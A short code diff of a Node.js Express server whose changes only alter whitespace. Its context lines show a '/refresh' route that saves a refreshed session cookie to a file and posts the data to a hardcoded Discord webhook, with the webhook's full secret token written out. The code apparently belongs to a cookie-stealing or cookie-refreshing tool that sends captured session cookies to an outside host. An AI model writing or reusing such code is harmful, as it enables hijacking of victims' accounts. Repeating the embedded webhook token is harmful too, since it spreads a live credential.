@@ -1,4 +1,3 @@
-
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
@@ -57,7 +56,7 @@ app.get('/refresh', async (req, res) => {
     };
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
-
+    
     const webhookURL = 'https://discord.com/api/webhooks/1235982818493071391/i4EOzhxVVcPIieTdSGzuMbLksuM6jGJXKX-PCi0FEkZOYmJP7ukNcmFg2MJd6lfTaxUQ';
     const response = await axios.post(webhookURL, {
         embeds: [
